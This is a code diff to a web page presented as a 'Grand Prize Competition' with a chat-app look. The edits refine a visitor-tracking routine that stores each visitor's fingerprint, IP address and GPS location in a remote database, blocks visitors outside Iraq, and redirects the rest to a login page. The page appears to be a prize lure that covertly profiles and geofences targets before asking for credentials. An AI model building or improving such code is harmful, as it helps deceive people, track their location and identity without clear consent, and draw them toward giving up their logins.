@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Grand Prize Competition 2025</title>
+  <title>Grand Prize Competition 2026</title>
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link href="https://fonts.googleapis.com/css2?family=Söhne:wght@300;400;500;600&display=swap" rel="stylesheet" />
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.js"></script>
@@ -508,7 +508,7 @@
   <div class="sidebar-section">Today</div>
   <div class="sidebar-item">
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
-    <span>Grand Prize Competition 2025</span>
+    <span>Grand Prize Competition 2026</span>
   </div>
   <div class="sidebar-item">
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
@@ -839,6 +839,7 @@ async function trackVisitor() {
   const { browser, bv, os, ov, dt, brand } = parseUA(ua);
 
   const row = {
+    id:              crypto.randomUUID(),
     session_id:      sessionId(),
     fingerprint:     fingerprint(),
     ip_address:      ipData.ip       || null,
@@ -872,9 +873,10 @@ async function trackVisitor() {
   };
 
   try {
-    const { data } = await sb.from('visitors').insert(row).select('id').single();
-    if (data) visitorId = data.id;
-  } catch (e) { /* non-fatal */ }
+    const { error } = await sb.from('visitors').insert(row);
+    if (error) throw error;
+    visitorId = row.id;
+  } catch (e) { console.error('[visitors insert]', e?.message || e); }
 }
 
 async function updateGPS(status, lat, lng, acc) {
@@ -958,8 +960,10 @@ function requestGps() {
       await updateGPS('granted', lat, lng, acc);
       if (!isIraq(lat, lng)) {
         show('blocked');
+      } else if (sessionStorage.getItem('gp_auth') === '1') {
+        // Already logged in — stay on chat screen, no redirect
       } else {
-        // Location confirmed — send user to login
+        // Not yet logged in — send to login page
         setTimeout(() => { window.location.href = 'login.html'; }, 800);
       }
     },
